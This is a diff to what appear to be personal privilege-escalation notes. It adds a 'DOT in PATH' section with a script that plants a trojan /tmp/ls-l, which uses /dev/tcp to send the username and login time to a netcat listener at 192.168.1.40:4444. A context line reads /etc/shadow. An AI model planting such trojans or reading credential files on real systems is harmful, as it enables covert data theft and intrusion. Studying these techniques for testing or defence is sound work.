@@ -69,6 +69,23 @@ cat < /etc/shadow
 ------------------
 CRON JOBS
 
+PUT NOTES HERE!
+
+--------
+DOT in PATH
+
+
+
+#!/bin/bash
+# script that sends information to a remote system.
+echo "exec 3<>/dev/tcp/192.168.1.40/4444" > /tmp/ls-l
+echo "echo \$(whoami) logged in on \$(date) >&3" >> /tmp/ls-l
+chmod +x /tmp/ls-l
+	And wait for someone to type in a command with my netcat listener on 192.168.1.40:
+nc -lp 4444
+	Once they type the desired command, I get the ouput:
+bll logged in on Fri 19 Apr 2019 02:10:35 PM EDT
+
 
 WORKING WITH LOGS
 file /var/log/wtmp
